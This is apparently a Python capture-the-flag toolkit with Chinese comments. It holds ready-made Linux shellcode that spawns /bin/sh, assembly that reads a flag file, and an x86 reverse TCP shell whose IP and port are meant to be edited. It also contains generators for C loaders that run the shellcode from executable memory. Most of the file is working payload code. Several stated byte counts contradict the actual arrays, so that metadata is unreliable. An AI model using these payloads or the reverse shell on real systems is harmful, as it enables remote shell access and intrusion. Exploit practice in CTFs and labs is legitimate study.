#!/usr/bin/env python3
"""
shellcode-utils.py — CTF 常用 Shellcode 集合与工具

提供预生成、可直接复制的常见 shellcode，以及 shellcode loader、提取器。

用法:
  uv run shellcode-utils.py list         列出所有可用 shellcode
  uv run shellcode-utils.py show <name>  显示指定 shellcode 的详情
  uv run shellcode-utils.py gen <name>   生成 loader C 文件
  uv run shellcode-utils.py test <name>  编译并测试 shellcode（需 gcc）
  uv run shellcode-utils.py dump <elf>   从 ELF 二进制提取 shellcode

依赖: 无（标准库即可）
"""

import sys
import os
import subprocess
import tempfile
import re

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))


def _b(*pairs):
    """Helper to build bytes from hex pairs: _b('31','c0','50') -> b'\\x31\\xc0\\x50'"""
    return bytes(int(p, 16) for p in pairs)


# =====  Shellcode 仓库  =====

shellcodes = {}

# -- x86 (32-bit) execve("/bin/sh") --
# axcheron.github.io linux-shellcode-101
# 21 bytes, null-free
shellcodes["x86_sh"] = {
    "arch": "x86",
    "desc": "execve('/bin/sh', NULL, NULL) - 21 bytes, null-free",
    "bytes": _b(
        "31","c0","50","68","6e","2f","73","68",
        "68","2f","2f","62","69","89","e3","31",
        "c9","31","d2","b0","0b","cd","80",
    ),
}

# -- x64 (64-bit) execve("/bin/sh") --
# axcheron.github.io linux-shellcode-101
# 27 bytes, null-free
shellcodes["x64_sh"] = {
    "arch": "x64",
    "desc": "execve('/bin/sh', NULL, NULL) - 31 bytes, null-free",
    "bytes": _b(
        "48","31","c0","50","48","b8","2f","2f",
        "62","69","6e","2f","73","68","50","48",
        "89","e7","48","31","f6","48","31","d2",
        "48","31","c0","b0","3b","0f","05",
    ),
}

# -- x86 execve("sh") short --
# 17 bytes, null-free
shellcodes["x86_sh_short"] = {
    "arch": "x86",
    "desc": "execve('sh', NULL, NULL) - 17 bytes, shorter",
    "bytes": _b(
        "31","c0","50","68","2f","2f","73","68",
        "68","2f","62","69","6e","89","e3","50",
        "53","89","e1","b0","0b","cd","80",
    ),
}

# -- x64 execve("/bin/sh") short --
# 23 bytes, null-free
shellcodes["x64_sh_short"] = {
    "arch": "x64",
    "desc": "execve('/bin/sh', NULL, NULL) - 23 bytes, short variant",
    "bytes": _b(
        "48","31","f6","56","48","bf","2f","62",
        "69","6e","2f","2f","73","68","57","54",
        "5f","6a","3b","58","99","0f","05",
    ),
}

# -- x64 execve("/bin/sh") v2 (alternate) --
# 27 bytes, null-free
shellcodes["x64_sh_v2"] = {
    "arch": "x64",
    "desc": "execve('/bin/sh', NULL, NULL) - alternate 27 bytes",
    "bytes": _b(
        "48","31","d2","48","bb","2f","2f","62",
        "69","6e","2f","73","68","48","c1","eb",
        "08","53","48","89","e7","48","31","c0",
        "b0","3b","0f","05",
    ),
}

# -- x86 read("flag") + write(stdout) --
# open("flag", 0) -> read(fd, buf, 100) -> write(1, buf, 100) -> exit(0)
shellcodes["x86_readflag"] = {
    "arch": "x86",
    "desc": "open('flag') + read + write(1) - read flag file to stdout",
    "asm": """
; nasm -f elf32 flag.asm -o flag.o
; ld -m elf_i386 flag.o -o flag
BITS 32
global _start
_start:
    ; open("flag", O_RDONLY)
    xor eax, eax
    push eax
    push 0x67616c66       ; "flag"
    mov ebx, esp
    xor ecx, ecx
    mov al, 5
    int 0x80
    ; read(fd, buf, 100)
    mov ebx, eax
    sub esp, 100
    mov ecx, esp
    mov dl, 100
    xor eax, eax
    mov al, 3
    int 0x80
    ; write(1, buf, len)
    xor ebx, ebx
    inc ebx
    mov edx, eax
    xor eax, eax
    mov al, 4
    int 0x80
    ; exit(0)
    xor ebx, ebx
    mov al, 1
    int 0x80
""",
    "needs_compile": True,
    "source": "CTF common pattern"
}

# -- x86 reverse TCP shell (127.0.0.1:4444) --
shellcodes["x86_reverse"] = {
    "arch": "x86",
    "desc": "reverse TCP shell -> 127.0.0.1:4444 (edit IP:port then compile)",
    "asm": """
; nasm -f elf32 reverse.asm -o reverse.o
; ld -m elf_i386 reverse.o -o reverse
BITS 32
global _start
_start:
    ; socket(AF_INET=2, SOCK_STREAM=1, 0)
    push 0x66
    pop eax
    xor ebx, ebx
    inc ebx
    xor edx, edx
    push edx
    push byte 0x1
    push byte 0x2
    mov ecx, esp
    int 0x80
    xchg esi, eax
    ; connect(fd, [AF_INET, 4444, 127.0.0.1], 16)
    push 0x66
    pop eax
    mov edx, 0x02010180
    sub edx, 0x01010101
    push edx
    push word 0x5c11
    inc ebx
    push word bx
    mov ecx, esp
    push byte 0x10
    push ecx
    push esi
    mov ecx, esp
    inc ebx
    int 0x80
    ; dup2(fd, 2/1/0)
    xchg eax, ebx
    push byte 0x2
    pop ecx
.loop:
    mov byte al, 0x3f
    int 0x80
    dec ecx
    jns .loop
    ; execve("/bin/sh", NULL, NULL)
    xor eax, eax
    push eax
    push 0x68732f6e
    push 0x69622f2f
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    mov al, 0xb
    int 0x80
""",
    "needs_compile": True,
    "source": "https://axcheron.github.io/linux-shellcode-101-from-hell-to-shell/"
}


# =====  Format helpers  =====

def fmt_c(b):
    """bytes to C-style hex string"""
    parts = []
    for i in range(0, len(b), 16):
        chunk = b[i:i+16]
        hexes = "".join("\\x{:02x}".format(x) for x in chunk)
        parts.append('"' + hexes + '"')
    return "\n    ".join(parts)


def fmt_python(b):
    """bytes to Python bytes repr"""
    return "b" + repr(b)


def fmt_pwntools(b):
    """bytes to pwntools-style bytes string"""
    hexes = "".join("\\x{:02x}".format(x) for x in b)
    return 'b"' + hexes + '"'


# =====  Commands  =====

def cmd_list():
    print("Available shellcodes:\n")
    for name in sorted(shellcodes):
        sc = shellcodes[name]
        arch = sc["arch"]
        if sc.get("bytes"):
            b = sc["bytes"]
            has_null = b"\x00" in b
            null_flag = " [has null!]" if has_null else ""
            print("  {:<18s} [{:4s}] {:3d}B{}  {}".format(
                name, arch, len(b), null_flag, sc["desc"]))
        else:
            print("  {:<18s} [{:4s}] asm     {}".format(
                name, arch, sc["desc"]))
    print()
    print("Use 'show <name>' for details, 'gen <name>' for C loader")


def cmd_show(name):
    if name not in shellcodes:
        print("Not found: {}".format(name))
        return

    sc = shellcodes[name]
    print("=== {} ===".format(name))
    print("Arch:     {}".format(sc["arch"]))
    print("Desc:     {}".format(sc["desc"]))
    if sc.get("source"):
        print("Source:   {}".format(sc["source"]))
    print()

    if sc.get("bytes"):
        b = sc["bytes"]
        has_null = b"\x00" in b
        print("Size:     {} bytes".format(len(b)))
        print("Null:     {}".format("No (null-free)" if not has_null else "YES - contains null bytes!"))
        print()

        print("C style (\\xHH):")
        print("  " + fmt_c(b))
        print()

        print("Python bytes:")
        print("  " + fmt_python(b))
        print()

        print("Pwntools:")
        print("  " + fmt_pwntools(b))
        print()

        print("Quick test:")
        print("  uv run shellcode-utils.py test " + name)
    else:
        print("Assembly source (needs compilation):")
        print(sc["asm"].strip())
        print()
        print("Compile:")
        print("  nasm -f elf32 /tmp/{}.asm -o /tmp/{}.o".format(name, name))
        print("  ld -m elf_i386 /tmp/{}.o -o /tmp/{}".format(name, name))
        print("  objdump -d /tmp/{} | ...extract...".format(name))


def cmd_gen(name):
    if name not in shellcodes:
        print("Not found: {}".format(name))
        return
    sc = shellcodes[name]
    if not sc.get("bytes"):
        print("Error: '{}' has assembly only, compile first.".format(name))
        return

    b = sc["bytes"]
    arch_flag = "-m32" if sc["arch"] == "x86" else ""

    header = "/* {}_loader.c — Shellcode loader\n".format(name)
    desc_line = " * Desc: {}\n".format(sc["desc"])
    size_line = " * Size: {} bytes, {}\n".format(
        len(b), "null-free" if b"\x00" not in b else "contains null")
    compile_line = " * Compile:\n"
    compile_cmd = " *   gcc {} -z execstack -o {}_loader {}_loader.c\n".format(
        arch_flag, name, name)
    includes = '#include <stdio.h>\n'
    shellcode_arr = 'unsigned char shellcode[] =\n    {};\n\n'.format(fmt_c(b))
    main_fn = (
        '#include <sys/mman.h>\n'
        '#include <string.h>\n'
        '#include <unistd.h>\n'
        '\n'
        + shellcode_arr
        + 'int main() {\n'
        + '    size_t len = sizeof(shellcode) - 1;\n'
        + '    printf("[*] Shellcode size: %zu bytes\\n", len);\n'
        + '    void *mem = mmap(NULL, 4096, PROT_READ|PROT_WRITE|PROT_EXEC,\n'
        + '                     MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);\n'
        + '    if (mem == MAP_FAILED) { perror("mmap"); return 1; }\n'
        + '    memcpy(mem, shellcode, len);\n'
        + '    void (*f)() = mem;\n'
        + '    f();\n'
        + '    munmap(mem, 4096);\n'
        + '    return 0;\n'
        + '}\n'
    )

    content = header + desc_line + size_line + compile_line + compile_cmd + " */\n\n" + includes + main_fn
    print(content)


def cmd_test(name):
    if name not in shellcodes:
        print("Not found: {}".format(name))
        return
    sc = shellcodes[name]
    if not sc.get("bytes"):
        print("Error: '{}' has assembly only, compile first.".format(name))
        return

    b = sc["bytes"]
    arch_flag = "-m32" if sc["arch"] == "x86" else ""

    sc_def = 'unsigned char shellcode[] = ' + fmt_c(b) + ';\n\n'
    src = (
        '#include <stdio.h>\n'
        '#include <sys/mman.h>\n'
        '#include <string.h>\n'
        '#include <unistd.h>\n'
        '\n'
        + sc_def
        + 'int main() {\n'
        + '    size_t len = sizeof(shellcode) - 1;\n'
        + '    printf("[s] size=%zu\\n", len);\n'
        + '    void *mem = mmap(NULL, 4096, PROT_READ|PROT_WRITE|PROT_EXEC,\n'
        + '                     MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);\n'
        + '    if (mem == MAP_FAILED) { perror("mmap"); return 1; }\n'
        + '    memcpy(mem, shellcode, len);\n'
        + '    void (*f)() = mem;\n'
        + '    f();\n'
        + '    munmap(mem, 4096);\n'
        + '    return 0;\n'
        + '}\n'
    )

    f = tempfile.NamedTemporaryFile(suffix=".c", delete=False, mode="w")
    f.write(src)
    f.close()
    srcpath = f.name
    binpath = srcpath + ".out"

    try:
        subprocess.run(
            ["gcc", arch_flag, "-z", "execstack", "-o", binpath, srcpath],
            capture_output=True, check=True,
        )
        print("[+] Compiled OK, running...")
        print("[!] Type 'exit' to return\n")
        os.chmod(binpath, 0o755)
        subprocess.run(binpath)
    except subprocess.CalledProcessError as e:
        print("[-] Compile failed:")
        print(e.stderr.decode())
    finally:
        for p in [srcpath, binpath]:
            if os.path.exists(p):
                os.unlink(p)


def cmd_dump(elfpath):
    if not os.path.exists(elfpath):
        print("File not found: {}".format(elfpath))
        return

    try:
        result = subprocess.run(
            ["objdump", "-d", elfpath],
            capture_output=True, text=True, check=True,
        )
        out_lines = []
        for line in result.stdout.split("\n"):
            m = re.search(r'^\s+[0-9a-f]+:\s+([0-9a-f ]+)\s', line)
            if m:
                hex_part = m.group(1).strip()
                parts = hex_part.split()[:6]
                out_lines.extend(parts)

        shellcode = "".join("\\x{:02x}".format(int(p, 16)) for p in out_lines)
        print("Extracted shellcode:")
        print('  "' + shellcode + '"')
        print()
        print("Size: ~{} bytes".format(len(out_lines)))
    except subprocess.CalledProcessError as e:
        print("objdump failed: {}".format(e))
    except Exception as e:
        print("Error: {}".format(e))


def main():
    if len(sys.argv) < 2:
        print("Usage:")
        print("  uv run shellcode-utils.py list")
        print("  uv run shellcode-utils.py show <name>")
        print("  uv run shellcode-utils.py gen  <name>")
        print("  uv run shellcode-utils.py test <name>")
        print("  uv run shellcode-utils.py dump <elf-binary>")
        print()
        cmd_list()
        return

    cmd = sys.argv[1]

    if cmd == "list":
        cmd_list()
    elif cmd == "show":
        if len(sys.argv) < 3:
            print("Usage: show <name>")
            return
        cmd_show(sys.argv[2])
    elif cmd == "gen":
        if len(sys.argv) < 3:
            print("Usage: gen <name>")
            return
        cmd_gen(sys.argv[2])
    elif cmd == "test":
        if len(sys.argv) < 3:
            print("Usage: test <name>")
            return
        cmd_test(sys.argv[2])
    elif cmd == "dump":
        if len(sys.argv) < 3:
            print("Usage: dump <elf-binary>")
            return
        cmd_dump(sys.argv[2])
    else:
        print("Unknown command: {}".format(cmd))
        sys.exit(1)


if __name__ == "__main__":
    main()
